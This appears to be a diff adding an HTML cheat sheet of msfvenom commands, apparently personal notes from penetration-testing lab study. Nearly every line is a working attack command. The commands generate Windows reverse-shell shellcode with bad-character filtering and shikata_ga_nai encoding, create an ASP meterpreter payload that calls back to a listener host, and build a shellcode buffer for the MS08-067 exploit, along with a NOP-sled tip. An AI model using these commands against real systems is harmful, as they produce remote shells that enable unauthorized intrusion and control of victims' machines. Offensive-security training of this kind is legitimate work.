@@ -1,0 +1,26 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>msfvenom</title>
+</head><body>##list all payloads<br/>
+msfvenom -l<br/>
+<br/>
+##list formats<br/>
+msfvenom --help-formats<br/>
+<br/>
+## will generate shell code for a windows32 bit reverse shell<br/>
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.183 LPORT=443 -f c -a x86 --platform windows <br/>
+## msfvenom but with bad characters specified and the default shellcode encoder which is shikata_ga_nai<br/>
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.183 LPORT=443 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai<br/>
+<br/>
+<br/>
+sometimes adding "\x90"*16 which is a do nothing command is helpful to keep the shellcode from being overwritten.<br/>
+<br/>
+<br/>
+##Creates an asp meterpreter session<br/>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.183 LPORT=1337 -f asp &gt; example.asp<br/>
+<br/>
+##creates a buffer for ms08-067 python version<br/>
+msfvenom -p windows/shell/reverse_tcp LHOST=10.11.0.183 LPORT=1337 &nbsp;EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -v shellcode -f python<br/>
+</body></html>
